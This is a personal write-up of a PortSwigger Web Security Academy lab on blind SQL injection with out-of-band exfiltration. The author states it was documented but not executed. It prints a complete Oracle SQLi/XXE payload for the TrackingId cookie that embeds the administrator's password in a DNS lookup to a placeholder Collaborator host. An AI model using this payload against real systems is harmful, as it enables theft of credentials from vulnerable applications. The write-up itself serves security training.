---
title: "Lab 17: Blind SQL Injection with Out-of-Band Data Exfiltration"
---
# Lab 17: Blind SQL Injection with Out-of-Band Data Exfiltration

**Platform:** PortSwigger Web Security Academy

> **Note:** Same as Lab 16 — this requires Burp Suite Professional (Burp Collaborator), no free or external substitute exists. Documenting the solution from the lab's methodology; not executed, no screenshots.

## What's going on here

Lab 16 confirmed the database could reach out to an external server at all. This one goes further — instead of just proving an interaction happens, the actual password gets smuggled out inside the Collaborator subdomain itself. The DNS lookup becomes the exfiltration channel: whatever data gets stitched into the domain name shows up in Burp Collaborator's logs, no in-band response required.

## 🎯 Target

Exfiltrate the administrator's password directly through a Collaborator DNS/HTTP interaction.

## The theory

Same XXE-over-SQLi mechanism as Lab 16, but this time the subquery result — the password itself — gets concatenated straight into the subdomain being resolved:

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l')+FROM+dual--


The `||` concatenation drops the subquery's result directly in front of the Collaborator subdomain, so the entity resolution isn't just pinging a fixed address — it's resolving `<password>.your-collaborator-subdomain`. Whatever the password is becomes part of the hostname the database looks up.

The real Collaborator subdomain gets inserted the same way as Lab 16 (right-click → **Insert Collaborator payload**). After sending, the **Collaborator tab** would need a **Poll now** click, since the interaction fires asynchronously rather than showing up instantly.

## Result

Not executed — same Professional-only blocker as Lab 16. Per the methodology, the interaction log would show the full resolved domain name with the password embedded as the subdomain prefix, ready to log in with directly.

## Takeaway

Out-of-band interaction isn't just a confirmation tool — concatenating real data into the callback address turns it into a full exfiltration channel. This is often the last resort in real-world blind SQLi when the app gives away nothing in-band at all: no errors, no timing differences, no visible content changes. It's also the second lab in a row gated entirely behind the Professional edition, which is worth noting plainly in the writeup rather than glossing over.

---

That closes the out-of-band pair — both understood, neither executed, for the same licensing reason. One thing left in this path: SQLi doesn't always fail cleanly when it's blocked by input filtering, and encoding tricks can slip past those filters entirely: **[Lab 18 — SQL Injection with Filter Bypass via XML Encoding](lab-18-xml-encoding-bypass.md)**.
